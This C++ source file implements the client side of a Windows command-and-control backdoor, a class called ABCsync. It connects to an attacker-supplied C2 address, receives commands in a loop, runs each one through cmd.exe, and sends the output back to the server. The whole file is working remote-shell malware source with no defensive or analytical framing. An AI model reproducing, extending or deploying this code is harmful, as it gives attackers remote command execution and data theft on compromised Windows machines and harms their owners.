#include "ABCsync.h"
#include <iostream>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

SOCKET c2Socket;  // Define a global variable for the C2 socket

bool ABCsync::connectToC2(const std::string& c2Address, int port) {
    WSADATA wsaData;
    sockaddr_in serverAddr;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "[!] Failed to initialize Winsock." << std::endl;
        return false;
    }

    // Create socket
    c2Socket = socket(AF_INET, SOCK_STREAM, 0);
    if (c2Socket == INVALID_SOCKET) {
        std::cerr << "[!] Failed to create socket." << std::endl;
        WSACleanup();
        return false;
    }

    // Set up server address
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(c2Address.c_str());

    // Connect to C2 server
    if (connect(c2Socket, (sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        std::cerr << "[!] Failed to connect to C2 server." << std::endl;
        closesocket(c2Socket);
        WSACleanup();
        return false;
    }

    std::cout << "[*] Connected to C2 server." << std::endl;

    // Listen for commands from the server
    char buffer[1024];
    int bytesRead;
    while ((bytesRead = recv(c2Socket, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytesRead] = '\0';  // Null-terminate the received data
        std::cout << "[*] Received command: " << buffer << std::endl;
        executeRemoteCommand(buffer);  // Execute the received command
    }

    closesocket(c2Socket);
    WSACleanup();
    return true;
}

bool ABCsync::executeRemoteCommand(const std::string& command) {
    std::string adjustedCommand = command;

    // Translate Linux-specific commands to Windows equivalents
    if (command == "pwd") {
        adjustedCommand = "cd";  // In Windows, "cd" prints the current directory
    }
    else if (command == "ls") {
        adjustedCommand = "dir";  // In Windows, "dir" lists directory contents
    }

    std::cout << "[*] Executing command: " << adjustedCommand << std::endl;
    return executeCommand(adjustedCommand);
}

bool ABCsync::executeCommand(const std::string& command) {
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    HANDLE hStdOutRead, hStdOutWrite;
    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0)) {
        std::cerr << "[!] Failed to create pipe." << std::endl;
        return false;
    }

    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = hStdOutWrite;
    siStartInfo.hStdOutput = hStdOutWrite;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    std::string cmd = "cmd.exe /c " + command;
    char cmdLine[1024];
    strncpy(cmdLine, cmd.c_str(), sizeof(cmdLine));

    if (!CreateProcess(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo)) {
        std::cerr << "[!] Failed to execute command." << std::endl;
        CloseHandle(hStdOutRead);
        CloseHandle(hStdOutWrite);
        return false;
    }

    WaitForSingleObject(piProcInfo.hProcess, INFINITE);

    DWORD bytesRead;
    char buffer[4096];
    bool success = false;
    if (ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
        buffer[bytesRead] = '\0';
        std::cout << "[*] Command output: " << buffer << std::endl;

        // Send the command output back to the C2 server
        send(c2Socket, buffer, bytesRead, 0);

        success = true;
    }

    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);
    CloseHandle(hStdOutRead);
    CloseHandle(hStdOutWrite);

    return success;
}
